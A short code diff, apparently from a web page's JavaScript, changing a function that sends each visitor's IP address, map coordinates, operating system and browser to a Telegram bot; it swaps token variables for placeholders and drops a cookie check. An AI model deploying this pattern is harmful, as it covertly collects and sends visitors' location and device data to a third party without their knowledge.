@@ -198,7 +198,7 @@
             return browser;
         }
 
-        async function sendIPToTelegram(ip, location, os, browser) {
+async function sendIPToTelegram(ip, location, os, browser) {
     const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
     const message = `
 New visitor detected!
@@ -208,8 +208,8 @@ Google Maps: ${googleMapsUrl}
 Operating System: ${os}
 Browser: ${browser}
     `;
-    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const telegramBotToken = 'YOUR_BOT_TOKEN_PLACEHOLDER';
+    const chatId = 'YOUR_CHAT_ID_PLACEHOLDER';
     try {
         let response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
             method: 'POST',
@@ -232,15 +232,6 @@ Browser: ${browser}
         console.error('Error sending message to Telegram:', error);
     }
 }
-        // Function to check if the visitor has been counted
-        function isVisitorCounted() {
-            let visited = document.cookie.includes('visited=true');
-            if (!visited) {
-                document.cookie = 'visited=true; max-age=86400'; // Cookie expires in 24 hours
-            }
-            return visited;
-        }
-
         // Function to retrieve visitor count
         function getVisitorCount() {
             let count = localStorage.getItem('visitorCount') || 0;
